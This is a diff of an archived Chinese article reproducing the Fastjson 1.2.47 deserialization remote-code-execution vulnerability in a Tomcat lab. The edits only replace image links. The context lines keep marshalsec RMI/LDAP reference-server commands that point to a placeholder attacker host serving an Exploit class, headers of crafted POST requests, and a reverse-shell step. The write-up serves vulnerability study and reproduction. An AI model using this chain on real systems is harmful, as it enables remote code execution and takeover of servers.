@@ -42,7 +42,7 @@ schema_version: "1"
 
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/DULDnKo4mD3ZEKWZm7ZIkg)
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/uljkOgZGRjfF5ibf0Z5YpAz9OYs2iaSVKV5smZ8qw3Cz08wJlPqAQPEQmribeeNZDc3837OUb4icSFERS0XX7bwMPA/640?wx_fmt=jpeg)
+![](../../.resource/remote/877017e1ee418903a46840eaf7e518c78dbfc5e4dd7d3059822c60e25b1f7646.jpg)
 
 一、漏洞描述
 
@@ -65,13 +65,13 @@ Tomcat 搭建（公众号后台回复 “Fastjson” 获取环境和 EXP）
 
 位置 tomcat/webapps 下面
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfF5ibf0Z5YpAz9OYs2iaSVKV4ic0Lt9fMdaytQnI3ibNE5NFgFTOn3qAOVtRtAxJSj53ibcPYIw3AAqgA/640?wx_fmt=png)
+![](../../.resource/remote/a4cae602101794872d4851f1fc84dbe2ae20465bf09df06d341671cbff1f4b0e.png)
 
 启动 tomcat
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfF5ibf0Z5YpAz9OYs2iaSVKVsZLlZiatyYOl3tA4iayxoG6nS6YL61Q6Pjyh5p0RPvOo2LmtOqA5p6hA/640?wx_fmt=png)
+![](../../.resource/remote/cd642612139510a2bbde563e227b9649def8eb772a794589dd7dfe9bf6c0e827.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfF5ibf0Z5YpAz9OYs2iaSVKVChbUmXA4icO9omswkgPwLeG7MDW9Rbh5GCe19DGAAfuice6uhibNhB0dg/640?wx_fmt=png)
+![](../../.resource/remote/e9a0c8b77ec40780bc20c88d6029c231c8d472308b1218b0881dea7f000e86a3.png)
 
 四、漏洞复现  
 
@@ -115,7 +115,7 @@ python 启动 web 服务
 python -m SimpleHTTPServer  1111
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfF5ibf0Z5YpAz9OYs2iaSVKVs2yfMaKSyVFPI9DcnafoSPTwPicXDLXbUAicQjial0fTTbBEENOw9k4FQ/640?wx_fmt=png)
+![](../../.resource/remote/b9cf6b7ecf9b4b17ba95c7876e0655eb9bbf087735bdd4aa7ae4919b150d3004.png)
 
 通过 python 启动 exphttp 服务启动 ldap 服务 (RMI 服务)
 
@@ -123,18 +123,18 @@ python -m SimpleHTTPServer  1111
 
 不支持基本上，rmi 服务接受到了请求，直接就 close 掉了。注意这个细节点
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfF5ibf0Z5YpAz9OYs2iaSVKVn2ukCgvMibicpX3Pnm6U9HaFYyVzpPWI3qROb6ic5eRElxf56Qlev34zQ/640?wx_fmt=png)
+![](../../.resource/remote/b16da8a7cedfae774e40f8b63623a7fdd39d01a8efeb03e6a90779ed2a80d164.png)
 
 ```
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar  marshalsec.jndi.RMIRefServer  http://XX.XX.XX.XX:1111/\#Exploit 9999
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar  marshalsec.jndi.LDAPRefServer  http://XX.XX.XX.XX:1111/\#Exploit 9999
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfF5ibf0Z5YpAz9OYs2iaSVKVbIWgVXFPibVOCYAzFticCpj9ycdiabTX2ZodsB8IScRnl950q0VjhIa7Q/640?wx_fmt=png)
+![](../../.resource/remote/e19402515ef1ccb5612c0bd0577f2a59c9d5ee2c28d5f450b395974bf55fec9f.png)
 
 ldap 抓包访问修改数据包  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfF5ibf0Z5YpAz9OYs2iaSVKVf51YpZiagBMNbonJD8C5rfkdV4NNkdCznxTQ0GvK2RpS4cS8xO3js1g/640?wx_fmt=png)
+![](../../.resource/remote/7723560a3c8fa9990bc5b19b96e4e8529380ab1a3daba1cc77927fbd644f0c79.png)
 
 ```
 POST /fastjson-1.2.47/ HTTP/1.1
@@ -162,7 +162,7 @@ Content-Length: 275
 
 rmi 整理  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfF5ibf0Z5YpAz9OYs2iaSVKVDD7z4PJ5P8WxndiaeFFLjZuxYwzmN0wPHXlJwib1dMGcdUhf2MPvGMicQ/640?wx_fmt=png)
+![](../../.resource/remote/36099f102f3ec8828f92f7225027ec531f3ec64facd2512a9671d8dd067b742b.png)
 
 ```
 POST /fastjson-1.2.47/ HTTP/1.1
@@ -191,23 +191,23 @@ Content-Length: 274
 
 执行发送 exp.class  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfF5ibf0Z5YpAz9OYs2iaSVKV5e6ldqwOcFSRNtfU4GohPic9QbbM0syOnFIZ5t2GYdpH6aNdK34flaQ/640?wx_fmt=png)
+![](../../.resource/remote/617aae31ef9a36e3f62b99130a02d965f491fb095690cf516a5cd45b42cf2f8a.png)
 
 rmi 整理
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfF5ibf0Z5YpAz9OYs2iaSVKV99jOd7o3x4Ec65j1V6ic4ic6FjXCvODFeibQVvuzp2MibpMeUxc9iapR1jQ/640?wx_fmt=png)
+![](../../.resource/remote/23db30e78500f5d0561e9781825b105ef45ab33395620b31bc3e111f852d492a.png)
 
 监听反弹 shell
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfF5ibf0Z5YpAz9OYs2iaSVKVSct2VXMOjYBoy4FyFmBbsbhZiagbasicnf4vVwAgyeY2NB79D09bMpaw/640?wx_fmt=png)
+![](../../.resource/remote/efcb7645eb8b44100216032ead8386fbca8f6c07e42e70c19f5e0be76f4c0616.png)
 
 获取到 shell
 
 idea 去调试启动计算器  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfF5ibf0Z5YpAz9OYs2iaSVKVuLeZVnhkw1kzyZnEWXAhrMClpD7Etib7uuL7UokhJaMfQKVhr7GQ8Xg/640?wx_fmt=png)
+![](../../.resource/remote/c566829cbc03fb1dbb37257d861e61b0c54f89c024512852b657efa011579ce6.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfF5ibf0Z5YpAz9OYs2iaSVKV6icaicBVF6QpfbrxjesfTQqRcl90TpEq1cng9nIHl86CPcWvN6uMZWdg/640?wx_fmt=png)
+![](../../.resource/remote/a94a1a8938762e1f3916b924f0fd0894cc199035cc05f41b00b72cd8dc388c0a.png)
 
 各版本的 EXP：  
 
@@ -259,7 +259,7 @@ https://github.com/alibaba/fastjson
 
 注意：Rmi 和 Ldap 启动的 Java 环境的版本（启动服务之前用 java -version 查看自己的 jdk 版本是否低于以下 jdk 版本）
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfF5ibf0Z5YpAz9OYs2iaSVKVosZNP8h4n7Hb4VWUC8dx67phKMVu9keYnhHvX8LGDElhqbCqdmCUGw/640?wx_fmt=png)
+![](../../.resource/remote/62b2475afae49ecb43e2f9c71b61d343a461c3d05b27fda3f59dc2a8e174a0bd.png)
 
 参考：
 
@@ -285,7 +285,7 @@ thelostworld
 
 安全路上，与你并肩前行！！！！
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/uljkOgZGRjeUdNIfB9qQKpwD7fiaNJ6JdXjenGicKJg8tqrSjxK5iaFtCVM8TKIUtr7BoePtkHDicUSsYzuicZHt9icw/640?wx_fmt=jpeg)
+![](../../.resource/remote/7a6d2f13ca361326dd71145e64ce4b16b853688149568ad8f7594066b738e9c1.jpg)
 
 个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns
 
@@ -299,11 +299,11 @@ FREEBUF 主页：https://www.freebuf.com/author/thelostworld?type=article
 
 语雀博客主页：https://www.yuque.com/thelostworld
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcW6VR2xoE3js2J4uFMbFUKgglmlkCgua98XibptoPLesmlclJyJYpwmWIDIViaJWux8zOPFn01sONw/640?wx_fmt=png)
+![](../../.resource/remote/64b19fa585837043e1eae7cea904e1b86a2db6ccb2fdde1d09513641413365d6.png)
 
 欢迎添加本公众号作者微信交流，添加时备注一下 “公众号”  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcSQn373grjydSAvWcmAgI3ibf9GUyuOCzpVJBq6z1Z60vzBjlEWLAu4gD9Lk4S57BcEiaGOibJfoXicQ/640?wx_fmt=png)
+![](../../.resource/remote/9255e3712e3885c431d5087872642f32c2e71629b39b93e381a5a147814af2d4.png)
 
 ---
 
